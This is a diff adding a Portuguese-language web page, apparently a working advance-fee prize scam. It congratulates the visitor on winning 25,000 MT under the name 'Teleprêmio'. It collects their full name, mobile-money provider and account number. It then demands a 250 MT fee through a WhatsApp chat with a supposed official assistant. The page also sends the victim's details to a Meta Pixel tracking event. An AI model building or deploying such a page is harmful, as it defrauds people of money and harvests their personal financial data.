@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Teleprêmio – Confirmação</title>
+
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s){
+      if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)}; 
+      if(!f._fbq)n=f.fbq;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '4179716432354886');
+      fbq('track', 'PageView');
+  </script>
+  <!-- End Meta Pixel Code -->
+
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTobRKTKBsfsN3iwsYgR46_HSN4F02JpTJ7V_Kw-LRpZNhlznBEo_G-UyQdOu-7aeD3y7c&usqp=CAU") no-repeat center center/cover;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh; margin: 0; position: relative;
+    }
+    body::before {
+      content:""; position:absolute; inset:0;
+      background: rgba(255,255,255,0.35);
+      backdrop-filter: blur(6px);
+    }
+    .container {
+      position: relative; z-index: 2;
+      background: rgba(255,255,255,0.97);
+      border-radius: 18px;
+      padding: 28px; max-width: 460px; width: 92%;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+      animation: fadeIn 0.8s ease;
+      text-align:center;
+    }
+    @keyframes fadeIn {from{opacity:0; transform:translateY(20px);}to{opacity:1; transform:translateY(0);}}
+    h2 { color:#DAA520; text-align:center; margin-bottom:15px; }
+    p { color:#444; font-size:15px; line-height:1.5; }
+    label { display:block; margin:12px 0 6px; font-weight:600; text-align:left; }
+    input, select {
+      width:100%; padding:12px; border:1px solid #ddd; border-radius:8px;
+      font-size:15px; margin-bottom:10px;
+    }
+    .btn {
+      display:block; width:100%; padding:14px;
+      border:0; border-radius:12px;
+      background:linear-gradient(135deg,#FFD700,#FFC300);
+      color:#000; font-weight:700; font-size:16px; cursor:pointer;
+      box-shadow:0 4px 12px rgba(218,165,32,0.5); transition:all .3s;
+      margin-top:15px;
+    }
+    .btn:hover { transform:translateY(-2px); }
+
+    .logo {
+      width:90px; margin:0 auto 15px; display:block;
+      border-radius:50%;
+    }
+
+    .overlay {
+      position:fixed; inset:0; background:rgba(0,0,0,0.6);
+      display:none; align-items:center; justify-content:center;
+      z-index:10;
+    }
+    .popup {
+      background:#fff; border-radius:16px;
+      padding:25px; max-width:380px; text-align:center;
+      box-shadow:0 10px 30px rgba(0,0,0,0.3);
+      animation: popupAnim 0.5s ease;
+    }
+    @keyframes popupAnim {from{transform:scale(0.8);opacity:0;}to{transform:scale(1);opacity:1;}}
+    .popup h3 { margin:0 0 10px; color:#DAA520; }
+    .popup p { font-size:15px; margin-bottom:18px; }
+    .cta {
+      display:inline-block; text-decoration:none;
+      background:#FFD700; color:#000; padding:14px 24px;
+      border-radius:10px; font-weight:700;
+      box-shadow:0 4px 12px rgba(218,165,32,0.5);
+      transition:background .3s;
+    }
+    .cta:hover { background:#FFC300; }
+  </style>
+</head>
+<body>
+  <div class="container" id="formContainer">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTobRKTKBsfsN3iwsYgR46_HSN4F02JpTJ7V_Kw-LRpZNhlznBEo_G-UyQdOu-7aeD3y7c&usqp=CAU" alt="Teleprêmio Logo" class="logo">
+    <h2>🎉 Parabéns! Você ganhou 25.000 MT</h2>
+    <p>Preencha os dados abaixo para confirmar o seu prêmio oficial do <b>Teleprêmio</b>.</p>
+
+    <form id="premioForm">
+      <label>Nome completo</label>
+      <input type="text" id="nome" required="">
+
+      <label>Selecione o método</label>
+      <select id="metodo" required="">
+        <option value="">-- Escolha onde vai receber o valor --</option>
+        <option value="M-Pesa">M-Pesa</option>
+        <option value="e-Mola">e-Mola</option>
+      </select>
+
+      <label>Número da conta</label>
+      <input type="text" id="numero" placeholder="Ex: 84xxxxxxx" required="">
+
+      <button type="submit" class="btn">Confirmar Dados</button>
+    </form>
+  </div>
+
+  <!-- Popup Confirmação -->
+  <div class="overlay" id="popupConfirmacao">
+    <div class="popup">
+      <h3>✅ Seus Dados Foram Confirmados</h3>
+      <p id="msgConfirmacao"></p>
+      <p>🎉 Seu prêmio de <b>25.000 MT</b> já está reservado.<br>  
+      Para ativar, conclua o pagamento da taxa de <b>250 MT</b>.</p>
+      <a id="btnWhatsApp" href="#" target="_blank" class="cta" onclick="finalizarWhatsApp(event)">
+        💬 Falar com Martinho (Assistente Oficial)
+      </a>
+    </div>
+  </div>
+
+  <!-- Popup Erro -->
+  <div class="overlay" id="popupErro">
+    <div class="popup">
+      <h3>⚠️ Número inválido</h3>
+      <p>Por favor, corrija o número e tente novamente.</p>
+      <a href="#" class="cta" onclick="fecharPopup('popupErro')">Corrigir</a>
+    </div>
+  </div>
+
+<script>
+  let nome, metodo, numero;
+  const form = document.getElementById("premioForm");
+  const popupConfirmacao = document.getElementById("popupConfirmacao");
+  const popupErro = document.getElementById("popupErro");
+  const msgConfirmacao = document.getElementById("msgConfirmacao");
+  const btnWhatsApp = document.getElementById("btnWhatsApp");
+
+  form.addEventListener("submit", function(e){
+    e.preventDefault();
+    nome = document.getElementById("nome").value.trim();
+    metodo = document.getElementById("metodo").value;
+    numero = document.getElementById("numero").value.trim().replace(/\D/g,"");
+
+    // validação prefixo
+    if(metodo === "M-Pesa" && !(numero.startsWith("84") || numero.startsWith("85"))){
+      popupErro.style.display = "flex";
+      return;
+    }
+    if(metodo === "e-Mola" && !(numero.startsWith("86") || numero.startsWith("87"))){
+      popupErro.style.display = "flex";
+      return;
+    }
+
+    if(!numero.startsWith("258")) numero = "258" + numero;
+
+    msgConfirmacao.innerHTML = `
+      Nome: <b>${nome}</b><br>
+      Método: <b>${metodo}</b><br>
+      Número: <b>${numero}</b><br>
+      Valor: <b>25.000 MT</b>`;
+
+    popupConfirmacao.style.display = "flex";
+  });
+
+  function finalizarWhatsApp(e){
+    e.preventDefault();
+
+    let mensagem = `Eu sou ${nome}! 🎉%0A` +
+      `Confirmo meus dados para receber o prêmio de 25.000 MT.%0A` +
+      `Método: ${metodo}%0A` +
+      `Número: ${numero}%0A%0A` +
+      `Quero concluir o pagamento da taxa de 250 MT agora.`;  
+
+    btnWhatsApp.href = `https://wa.me/13438002853?text=${mensagem}`;
+
+    fbq('track', 'InitiateCheckout');
+    fbq('track', 'Lead', { nome: nome, metodo: metodo, numero: numero, valor: 25000 });
+
+    window.open(btnWhatsApp.href, '_blank');
+  }
+
+  function fecharPopup(id){
+    document.getElementById(id).style.display = "none";
+  }
+</script>
+
+
+
+
++258 858 142 023
+</body></html>
